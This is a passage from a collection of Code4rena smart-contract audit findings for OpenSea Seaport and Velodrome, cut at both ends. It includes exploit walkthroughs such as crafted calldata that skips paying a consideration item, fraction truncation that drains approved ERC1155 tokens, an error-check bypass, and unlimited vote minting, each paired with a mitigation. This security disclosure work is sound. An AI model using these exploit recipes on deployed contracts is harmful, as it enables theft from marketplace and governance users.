([L75](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/Assertions.sol#L75-L83)), it accepts also a length smaller than the original by 1 (basically there shouldn't be a `+ 1` in the first argument).  Interestingly enough, in the case `additionalRecipients.length < totalOriginalAdditionalRecipients`, the inline-assembly for-loop at [(L506)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L506) will read consideration items out-of-bounds. This can be a vector of exploits, as illustrated below.  ## Proof of Concept Alice makes the following offer: a basic order, with two `considerationItem`s. The second item has the following data: ```js consideration[1] = {  itemType: ...,  token: ...,  identifierOrCriteria: ...,  startAmount: X,  endAmount: X,  recipient: Y, } ``` The only quantities we need to track are the amounts `X` and recipient `Y`.  When fulfilling the order normally, the fulfiller will spend `X` tokens sending them to `Y`. It's possible however to exploit the previous bug in a way that the fulfiller won't need to make this transfer.  To do this, the fulfiller needs to craft the following calldata:  | calldata pointer |   correct calldata   |   exploit calldata  | |-----------------:|:--------------------:|:-------------------:| |              ... |          ...         |         ...         | |            0x204 |   1 (tot original)   |   1 (tot original)  | |            0x224 |  0x240 (head addRec) | 0x240 (head addRec) | |            0x244 |   0x2a0 (head sign)  |  0x260 (head sign)  | |            0x264 |   1 (length addRec)  |  0 (length addRec)  | |            0x284 |      X (amount)      |   X (length sign)   | |            0x2a4 |     Y (recipient)    |    Y (sign body)    | |            0x2c4 |  0x40 (length sign)  |   0x00 (sign body)  | |            0x2e4 | [correct Alice sign] |         ...         | |            0x304 | [correct Alice sign] |         ...         | |                  |                      |                     |  Basically writing `additionalRecipients = []` and making the signature length = `X`, with `Y` being the first 32 bytes. Of course this signature will be invalid; however it doesn't matter since the exploiter can call `validate` with the correct signature beforehand.  The transaction trace will look like this: - the assertion `_assertConsiderationLengthIsNotLessThanOriginalConsiderationLength` passes; - the `orderHash` calculated is the correct one, since the for-loop over original consideration items picks up calldata at pointers {0x284, 0x2a4} [(L513)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L513-L550); - the order was already validated beforehand, so the signature isn't read; - at the end, during the tokens transfers, only `offer` and `consideration[0]` are transferred, since the code looks at `additionalRecipients` which is empty.  Conclusion:  Every Order that is \"basic\" and has two or more consideration items can be fulfilled in a way to not trade the _last_ consideration item in the list. The fulfiller spends less then normally, and a recipient doesn't get his due.  There's also an extra requirement which is stricter: this last item's `startAmount` (= endAmount) needs to be smallish (< 1e6). This is because this number becomes the signature bytes length, and we need to fill the calldata with extra zeroes to complete it. Realistically then the exploit will work only if the item is a ERC20 will low decimals.  I've made a hardhat test that exemplifies the exploit. [(Link to gist)](https://gist.github.com/0xsanson/e87e5fe26665c6cecaef2d9c4b0d53f4).  ## Recommended Mitigation Steps Remove the `+1` at L347.  "}, {"title": "Truncation in `OrderValidator` can lead to resetting the fill and selling more tokens", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L228 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L231 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L237 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L238   # Vulnerability details  ## Impact  A partial order's fractions (`numerator` and `denominator`) can be reset to `0` due to a truncation. This can be used to craft malicious orders:  1. Consider user Alice, who has 100 ERC1155 tokens, who approved all of their tokens to the `marketplaceContract`. 2. Alice places a `PARTIAL_OPEN` order with 10 ERC1155 tokens and consideration of ETH. 3. Malory tries to fill the order in the following way:     1. Malory tries to fill 50% of the order, but instead of providing the fraction `1 / 2`, Bob provides `2**118 / 2**119`. This sets the `totalFilled` to `2**118` and `totalSize` to `2**119`.     2. Malory tries to fill 10% of the order, by providing `1 / 10`. The computation `2**118 / 2**119 + 1 / 10` is done by \"cross multiplying\" the denominators, leading to the acutal fraction being `numerator = (2**118 * 10 + 2**119)` and `denominator = 2**119 * 10`.     3. Because of the `uint120` truncation in [OrderValidator.sol#L228-L248](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/OrderValidator.sol#L228-L248), the `numerator` and `denominator` are truncated to `0` and `0` respectively.     4. Bob can now continue filling the order and draining any approved (1000 tokens in total) of the above ERC1155 tokens, for the same consideration amount!   ## Proof of Concept   For a full POC: https://gist.github.com/hrkrshnn/7c51b23f7c43c55ba0f8157c3b298409  The following change would make the above POC fail: ```diff modified   contracts/lib/OrderValidator.sol @@ -225,6 +225,8 @@ contract OrderValidator is Executor, ZoneInteraction {                  // Update order status and fill amount, packing struct values.                  _orderStatus[orderHash].isValidated = true;                  _orderStatus[orderHash].isCancelled = false; +                require(filledNumerator + numerator <= type(uint120).max, \"overflow\"); +                require(denominator <= type(uint120).max, \"overflow\");                  _orderStatus[orderHash].numerator = uint120(                      filledNumerator + numerator                  ); @@ -234,6 +236,8 @@ contract OrderValidator is Executor, ZoneInteraction {              // Update order status and fill amount, packing struct values.              _orderStatus[orderHash].isValidated = true;              _orderStatus[orderHash].isCancelled = false; +            require(numerator <= type(uint120).max, \"overflow\"); +            require(denominator <= type(uint120).max, \"overflow\");              _orderStatus[orderHash].numerator = uint120(numerator);              _orderStatus[orderHash].denominator = uint120(denominator);          } ```  ## Tools Used  Manual review  ## Recommended Mitigation Steps  A basic fix for this would involve adding the above checks for overflow / truncation and reverting in that case. However, we think the mechanism is still flawed in some respects and require more changes to fully fix it. See a related issue: \"A malicious filler can fill a partial order in such a way that the rest cannot be filled by anyone\" that points out a related but a more fundamental issue with the mechanism.   "}, {"title": "`_aggregateValidFulfillmentOfferItems()` can be tricked to accept invalid inputs", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L406   # Vulnerability details  ## Impact   The `_aggregateValidFulfillmentOfferItems()` function aims to revert on orders with zero value or where a total consideration amount overflows. Internally this is accomplished by having a temporary variable `errorBuffer`, accumulating issues found, and only reverting once all the items are processed in case there was a problem found. This code is optimistic for valid inputs.  Note: there is a similar issue in `_aggregateValidFulfillmentConsiderationItems()` , which is reported separately.  The problem lies in how this `errorBuffer` is updated: ```solidity                 // Update error buffer (1 = zero amount, 2 = overflow).                 errorBuffer := or(                   errorBuffer,                   or(                     shl(1, lt(newAmount, amount)),                     iszero(mload(amountPtr))                   )                 ) ```  The final error handling code: ```solidity             // Determine if an error code is contained in the error buffer.             switch errorBuffer             case 1 {                 // Store the MissingItemAmount error signature.                 mstore(0, MissingItemAmount_error_signature)                  // Return, supplying MissingItemAmount signature.                 revert(0, MissingItemAmount_error_len)             }             case 2 {                 // If the sum overflowed, panic.                 throwOverflow()             } ```  While the expected value is `0` (success),  `1` or `2` (failure), it is possible to set it to `3`, which is unhandled and considered as a \"success\". This can be easily accomplished by having both an overflowing item and a zero item in the order list.  This validation error could lead to fulfilling an order with a consideration (potentially ~0) lower than expected.  ## Proof of Concept  Craft an offer containing two errors (e.g. with  zero amount and overflow). Call `matchOrders()`. Via calls to `_matchAdvancedOrders()`, `_fulfillAdvancedOrders()`, `_applyFulfillment()`, `_aggregateValidFulfillmentOfferItems()` will be called. The `errorBuffer` will get a value of 3  (the `or` of 1 and 2). As the value of 3 is not detected, no error will be thrown and the order will be executed, including the mal formed values.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  1. Change the check on [FulfillmentApplier.sol#L465](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L465)  to consider `case 3`. 2. Potential option: Introduce an early abort in case `errorBuffer != 0` on [FulfillmentApplier.sol#L338](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L338)  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/74", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "# Quality Report  Repo commit referenced: [`49799ce156d979132c9924a739ae45a38b39ecdd`](https://github.com/ProjectOpenSea/seaport/tree/49799ce156d979132c9924a739ae45a38b39ecdd)  ## BasicOrderFulfiller.sol  ### 1. Adding a new variable to the assembly  For lines [82-86](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L82-L86), we can define a new YUL variable, `basicOrderType` to remove the need to call `calldataload` twice and also adding the `BasicOrder_basicOrderType_cdPtr` twice to the stack, the modified code block  would look like this:  ```solidity let basicOrderType := calldataload(BasicOrder_basicOrderType_cdPtr)  // Mask all but 2 least-significant bits to derive the order type. orderType := and(basicOrderType, 3)  // Divide basicOrderType by four to derive the route. route := div(basicOrderType, 4) ```  This would make the code more readable and also should require less gas.  ### 2. Missing parameter NatSpec info  Function `_transferERC20AndFinalize` is missing a NatSpec info for `accumulator`. Need to add:  ```solidity * @param accumulator An open-ended array that collects transfers to execute *                    against a given conduit in a single call. ```  ## ConsiderationStructs.sol  Typo in `SpentItem` NatSpec comment `d` is missing from `and` (Line [`68`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/ConsiderationStructs.sol#L68)):  ```diff - * @dev A spent item is translated from a utilized offer item an has four +  * @dev A spent item is translated from a utilized offer item and has four ```  ## CriteriaResolution.sol  ### 1. Modify For loops to save gas  On line [`56`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L56) and [`166`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L166) the for loops can be modified to:  ```solidity uint256 i = 0;  // Iterate over each criteria resolver. for (; i < totalCriteriaResolvers;) {     ...     ++i; }  i = 0;  // Iterate over each advanced order. for (; i < totalAdvancedOrders;) {     ...     ++i; } ```  Note. We don't need to use `unchecked` for `++i` since both for loop blocks are child nodes of a bigger `unchecked` block.  The same modification can be made for the for loops with the `j` counter on line [`184`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L185) and [`199`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L199).  ### 2. Redundant array element lookup One line `177`, the ith element of `advancedOrders` is lookup even though that element is already have been saved in memory as `advancedOrder`  Current (lines [`168-178`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L168-178)):  ```solidity AdvancedOrder memory advancedOrder = advancedOrders[i];  // Skip criteria resolution for order if not fulfilled. if (advancedOrder.numerator == 0) {     continue; }  // Retrieve the parameters for the order. OrderParameters memory orderParameters = (     advancedOrders[i].parameters ); ```  So we can reuse `advancedOrder` and the modified block would be:  ```solidity AdvancedOrder memory advancedOrder = advancedOrders[i];  // Skip criteria resolution for order if not fulfilled. if (advancedOrder.numerator == 0) {     continue; }  // Retrieve the parameters for the order. OrderParameters memory orderParameters = (     advancedOrder.parameters ); ```  ie: ```diff - advancedOrders[i].parameters + advancedOrder.parameters ```  ## Executor.sol  Using the `AccumulatorArmed` defined constants from `ConsiderationConstants.sol`, we can rewrite [Executor.sol:L433](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/Executor.sol#L433):  ```diff // file: contracts/lib/Executor.sol:L433  - if (accumulator.length != 64) { + if (accumulator.length != AccumulatorArmed) { ```  ## FulfillmentApplier.sol  ### 1. Typo in comment  The `if` block on lines [`180-183`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/FulfillmentApplier.sol#L180-L183) has typos for the comment before the `if` block:  ```solidity // Set the offerer as the receipient if execution amount is nonzero. if (execution.item.amount == 0) {     execution.item.recipient = payable(execution.offerer); } ```  `nonzero` needs to be changed to `zero` and `receipient` to `recipient`  ```diff - // Set the offerer as the receipient if execution amount is nonzero. + // Set the offerer as the recipient if execution amount is zero. ```  ## GettersAndDerivers.sol  ### 1. Typo Typo in comment on line [`131`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L131), `offer items` should be `consideration items`:  ```diff - // Iterate over the offer items (not including tips). + // Iterate over the consideration items (not including tips). ```  ### 2. Unpredictable Memory Location  On line [`170`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L170) a memory location has been set with an unpredictable address/content:  ```solidity let typeHashPtr := sub(orderParameters, OneWord) ```   ## OrderCombiner.sol  For the function `_validateOrdersAndPrepareToFulfill` is the `maximumFulfilled` has been reached, the loop keeps continuing without essentailly doing anything other than wasting gas, since on line `196` it keeps jumping to the next `i` value. The `continue` statement on line `196` should be replaced by the `break` statement to exit the loop. ([Ref](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L181-L197))  ```diff for (uint256 i = 0; i < totalOrders; ++i) {     // Retrieve the current order.     AdvancedOrder memory advancedOrder = advancedOrders[i];      // Determine if max number orders have already been fulfilled.     if (maximumFulfilled == 0) {         // Mark fill fraction as zero as the order will not be used.         advancedOrder.numerator = 0;          // Update the length of the orderHashes array.         assembly {             mstore(orderHashes, add(i, 1))         }          // Continue iterating through the remaining orders. -        continue; +        break;     } ```  ## OrderFulfiller.sol  To optimize the for loop in Lines [468-475](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L468-L475)  The code block below:   ```solidity // Skip overflow check as the index for the loop starts at zero. unchecked {     // Iterate over the given orders.     for (uint256 i = 0; i < totalOrders; ++i) {         // Convert to partial order (1/1 or full fill) and update array.         advancedOrders[i] = _convertOrderToAdvanced(orders[i]);     } } ```  can be changed too:  ```solidity // Skip overflow check as the index for the loop starts at zero. unchecked {     // Iterate over the given orders.     uint256 i = 0;     for (; i < totalOrders;) {         // Convert to partial order (1/1 or full fill) and update array.         advancedOrders[i] = _convertOrderToAdvanced(orders[i]);          ++i;     } } ```  ## TokenTransferrer.sol  In the function  `_performERC1155BatchTransfers(ConduitBatch1155Transfer[] calldata batchTransfers)` on line `542` the `data` length offset value is incorrect.  ```solidity // Set the length of the data array in memory to zero. mstore(     add(         BatchTransfer1155Params_data_length_basePtr,         idsAndAmountsSize     ),     0 ) ```  This value is used to call a `safeBatchTransferFrom(address from, address to, uint256[] ids, uint256[] amounts, bytes data)` endpoint on a `ERC1155` contract.  The formula for the offset should be:  $$   \\text{data\\_length\\_offset} = \\mathtt{0x20} + \\mathtt{0x04} + \\mathtt{0xa0} + \\text{idsAndAmountsSize}  \\\\ = \\mathtt{0xc4} + \\text{idsAndAmountsSize}  $$  Currently the offset is $\\mathtt{0x104} + \\text{idsAndAmountsSize}$ which expands memory 2 words extra more than the necessary amount.  Here is an example (cast from foundry):  ``` >> cast abi-encode \"safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)\" 0x8496a8EDc4A0894123062194015c0Cf86b7A277c 0x8496a8EDc4A0894123062194015c0Cf86b7A277c [] [] 0x  0x00 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c from 0x20 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c to 0x40 00000000000000000000000000000000000000000000000000000000000000a0 head(ids) 0x60 00000000000000000000000000000000000000000000000000000000000000c0 head(amounts) 0x80 00000000000000000000000000000000000000000000000000000000000000e0 head(data) 0xa0 0000000000000000000000000000000000000000000000000000000000000000 ids_length 0xc0 0000000000000000000000000000000000000000000000000000000000000000 amounts_length 0xe0 0000000000000000000000000000000000000000000000000000000000000000 data_length ```  The above ABI encoding does not include the `ZeroSlot` in the memory and also the function signature after adding those according to the instruction in `_performERC1155BatchTransfers` we would get:  ``` 0x000 0000000000000000000000000000000000000000000000000000000000000000 ZeroSlot 0x004 2eb2c2d6 0x024 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c from 0x044 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c to 0x064 00000000000000000000000000000000000000000000000000000000000000a0 head(ids) 0x084 00000000000000000000000000000000000000000000000000000000000000c0 head(amounts) 0x0a4 00000000000000000000000000000000000000000000000000000000000000e0 head(data) 0x0c4 0000000000000000000000000000000000000000000000000000000000000000 ids_length 0x0e4 0000000000000000000000000000000000000000000000000000000000000000 amounts_length 0x104 0000000000000000000000000000000000000000000000000000000000000000 data_length ```  In this example we have `idsAndAmountsSize` = `0x40` = `TwoWords` and the constant `BatchTransfer1155Params_data_length_basePtr` = `0x104` (based on TokenTransferrerConstants.sol), so according to the line `TokenTransferrer.sol:542` the `data_length` memory offset would need to be `0x144` which is outside of the neccesssary memory area.  To fix this error, these changes need to be applied:  Block before change:  ```solidity // file: contract/lib/TokenTransferrer:L541  // Set the length of the data array in memory to zero. mstore(     add(         BatchTransfer1155Params_data_length_basePtr,         idsAndAmountsSize     ),     0 )  // Determine the total calldata size for the call to transfer. let transferDataSize := add(     BatchTransfer1155Params_data_length_basePtr,     mul(idsLength, TwoWords) ) ```  Block after change:  ```solidity // file: contract/lib/TokenTransferrer:L541  // Determine the total calldata size for the call to transfer. let transferDataSize := add(     BatchTransfer1155Params_data_length_basePtr,     idsAndAmountsSize )  // Set the length of the data array in memory to zero. mstore(     transferDataSize,     0 ) ```  and also the following constant would need to be updated:  ```diff // file: contract/lib/TokenTransferrerConstants.sol:L146  - uint256 constant BatchTransfer1155Params_data_length_basePtr = 0x104; + uint256 constant BatchTransfer1155Params_data_length_basePtr = 0xc4; ```  The change above removes uses less arithmetic operation which in turn would also save some gas.  ## ZoneInteractions.sol  For the function `_assertRestrictedAdvancedOrderValidity` on lines [104-113](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/ZoneInteraction.sol#L104-L113), `offerer` and `zone` are passed as two extra inputs although `advancedOrder` contains those 2 parameters.  ```solidity function _assertRestrictedAdvancedOrderValidity(     AdvancedOrder memory advancedOrder,     CriteriaResolver[] memory criteriaResolvers,     bytes32[] memory priorOrderHashes,     bytes32 orderHash,     bytes32 zoneHash,     OrderType orderType,     address offerer,     address zone ) internal view { ```  These parameters can be accessed as:  ```solidity advancedOrder.parameters.offerer advancedOrder.parameters.zone ```  This brings up the question if the extra inputs were provided like that to save gas, since using `advancedOrder.parameters.VARIABLE` would require the compiler to use extra instruction to calculate the memory offset and also load those variables to memory. This extra work was perhaps done in a function calling `_assertRestrictedAdvancedOrderValidity`.  ## ZoneInteractionErrors.sol  There is typo on line [`13`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/interfaces/ZoneInteractionErrors.sol#L13) in the NatSpec comment:  `offerrer` replaced by `offerer` ```diff - either the offerrer or the order's zone or approved as valid by the + either the offerer or the order's zone or approved as valid by the ```  ## For loops The for loops in these FILES:LINES   - [Conduit.sol:66](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/conduit/Conduit.sol#L66) - [Conduit.sol:130](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/conduit/Conduit.sol#L130) - [BasicFulfiller.sol:948](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L948) - [BasicFulFiller.sol:1040](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L1040) - [CriteriaResolution.sol:56](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L56) - [CriteriaResolution.sol:166](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L166) - [CriteriaResolution.sol:184](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L184) - [CriteriaResolution.sol:199](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L199) - [OrderCombiner.sol:181](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L181) - [OrderCombiner.sol:247](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L247) - [OrderCombiner.sol:291](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L291) - [OrderCombiner.sol:373](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L373) - [OrderCombiner.sol:473](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L473) - [OrderCombiner.sol:498](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L498) - [OrderCombiner.sol:577](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L577) - [OrderCombiner.sol:598](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L598) - [OrderCombiner.sol:621](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L621) - [OrderCombiner.sol:754](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L754) - [OrderFulfiller.sol:217](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L217) - [OrderFulfiller.sol:306](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L306) - [OrderFulfiller.sol:471](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L471) - [OrderValidator.sol:272](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderValidator.sol#L272) - [OrderValidator.sol:350](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderValidator.sol#L350)  can be changed.  General structure used: ```solidity for (uint256 i = 0; CONDITION; ++i) { ... } ```  Change to: ```solidity uint256 i = 0;  for (; CONDITION;) {      ...     unchecked {          ++i;     }  } ```  The `unchecked` inner block might not be necessary since some of the loops are inside a bigger `unchecked` block.  and for the assembly blocks in FILES:LINES:  - [BasicOrderFulfiller.sol:506](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L506) - [BasicOrderFulfiller.sol:615](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L615) - [CriteriaResolution.sol:256](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L256) - [GettersAndDerivers.sol:78](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L78) - [GettersAndDerivers.sol:133](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L133)  General structure used: ```solidity for { initial }{ condition }{ increment } { ... } ```  Change to ```solidity initial  for {}{ condition }{} {      ...      increment } ```"}, {"title": "Malicious user can populate `rewards` array with tokens of their interest reaching limits of `MAX_REWARD_TOKENS`", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/182", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "sponsor confirmed"], "target": "2022-05-velodrome-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L41-L60   # Vulnerability details  ## Impact  Malicious user can populate `rewards` array with different tokens early reaching limit of `MAX_REWARD_TOKENS` sending very small amount of different tokens. It will restrict any other tokens to be used as `rewards` in [Bribe.sol#notifyRewardAmount()](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L41)  ## Proof of Concept  A custom malicious contract can be created that can make multiple calls to `notifyRewardAmount()` sending very small amounts of different tokens to populate the array `rewards` and fulfill the total of `MAX_REWARD_TOKENS` . This will restrict any other person from adding to `rewards` array.   ## Tools Used  - Manual analysis  ## Recommended Mitigation Steps  "}, {"title": "Wrong reward distribution in Bribe because deliverReward() won't set tokenRewardsPerEpoch[token][epochStart] to 0 ", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/141", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-velodrome-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L83-L90   # Vulnerability details  ## Impact Function `deliverReward()` in `Bribe` contract won't set `tokenRewardsPerEpoch[token][epochStart]` to `0` after transferring rewards. `Gauge.getReward()` calls `Voter.distribute()` which calls `Gauge.deliverBribes()` which calls `Bribe.deliverReward()`. so if `Gauge.getReward()` or `Voter.distribute()` get called multiple times in same epoch then `deliverReward()` will transfer `Bribe` tokens multiple times because it doesn't set `tokenRewardsPerEpoch[token][epochStart]` to `0` after transferring.  ## Proof of Concept This is `deliverReward()` code in `Bribe`: ```   function deliverReward(address token, uint epochStart) external lock returns (uint) {     require(msg.sender == gauge);     uint rewardPerEpoch = tokenRewardsPerEpoch[token][epochStart];     if (rewardPerEpoch > 0) {       _safeTransfer(token, address(gauge), rewardPerEpoch);     }     return rewardPerEpoch;   } ``` As you can see it doesn't set `tokenRewardsPerEpoch[token][epochStart]` value to `0`, so if this function get called multiple times it will transfer epoch rewards multiple times (it will use other epoch's rewards tokens). function `Gauge.deliverBribes()` calls `Bribe.deliverReward()` and  `Gauge.deliverBribes()` is called by `Voter.distribute()` if the condition `claimable[_gauge] > DURATION` is `True`. This is those functions codes: ```     function deliverBribes() external lock {         require(msg.sender == voter);         IBribe sb = IBribe(bribe);         uint bribeStart = block.timestamp - (block.timestamp % (7 days)) + BRIBE_LAG;         uint numRewards = sb.rewardsListLength();          for (uint i = 0; i < numRewards; i++) {             address token = sb.rewards(i);             uint epochRewards = sb.deliverReward(token, bribeStart);             if (epochRewards > 0) {                 _notifyBribeAmount(token, epochRewards, bribeStart);             }         }     } ``` ```     function distribute(address _gauge) public lock {         require(isAlive[_gauge]); // killed gauges cannot distribute         uint dayCalc = block.timestamp % (7 days);         require((dayCalc < BRIBE_LAG) || (dayCalc > (DURATION + BRIBE_LAG)), \"cannot claim during votes period\");         IMinter(minter).update_period();         _updateFor(_gauge);         uint _claimable = claimable[_gauge];         if (_claimable > IGauge(_gauge).left(base) && _claimable / DURATION > 0) {             claimable[_gauge] = 0;             IGauge(_gauge).notifyRewardAmount(base, _claimable);             emit DistributeReward(msg.sender, _gauge, _claimable);             // distribute bribes & fees too             IGauge(_gauge).deliverBribes();         }     } ``` also `Gauge.getReward()` calls `Voter.getReward()`. condition `claimable[_gauge] > DURATION` in `Voter.distribute()` can be true multiple time in one epoch (`deliverBribes()` would be called multiple times) because `claimable[_gauge]` is based on `index` and `index` increase by `notifyRewardAmount()` in `Voter` anytime.  ## Tools Used VIM  ## Recommended Mitigation Steps set `tokenRewardsPerEpoch[token][epochStart]` to `0` in `deliverReward`  "}, {"title": "Users can get unlimited votes", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/129", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-velodrome-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L517-L528   # Vulnerability details  ## Impact Users can get unlimited votes which leads to them: 1. gaining control over governance 2. getting undeserved rewards 3. having their pools favored due to gauge values  ## Proof of Concept `_mint()` calls `_moveTokenDelegates()` to set up delegation... ```solidity File: contracts/contracts/VotingEscrow.sol   #1  462       function _mint(address _to, uint _tokenId) internal returns (bool) { 463           // Throws if `_to` is zero address 464           assert(_to != address(0)); 465           // TODO add delegates 466           // checkpoint for gov 467           _moveTokenDelegates(address(0), delegates(_to), _tokenId); ``` https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L462-L467  and `_transferFrom()` calls `_moveTokenDelegates()` to transfer delegates... ```solidity File: contracts/contracts/VotingEscrow.sol   #2  301       function _transferFrom( 302           address _from, 303           address _to, 304           uint _tokenId, 305           address _sender 306       ) internal { 307           require(attachments[_tokenId] == 0 && !voted[_tokenId], \"attached\"); 308           // Check requirements 309           require(_isApprovedOrOwner(_sender, _tokenId)); 310           // Clear approval. Throws if `_from` is not the current owner 311           _clearApproval(_from, _tokenId); 312           // Remove NFT. Throws if `_tokenId` is not a valid NFT 313           _removeTokenFrom(_from, _tokenId); 314           // TODO delegates 315           // auto re-delegate 316           _moveTokenDelegates(delegates(_from), delegates(_to), _tokenId); ``` https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L301-L316  but `_burn()` does not transfer them back to `address(0)` ```solidity File: contracts/contracts/VotingEscrow.sol   #3  517       function _burn(uint _tokenId) internal { 518           require(_isApprovedOrOwner(msg.sender, _tokenId), \"caller is not owner nor approved\"); 519    520           address owner = ownerOf(_tokenId); 521    522           // Clear approval 523           approve(address(0), _tokenId); 524           // TODO add delegates 525           // Remove token 526           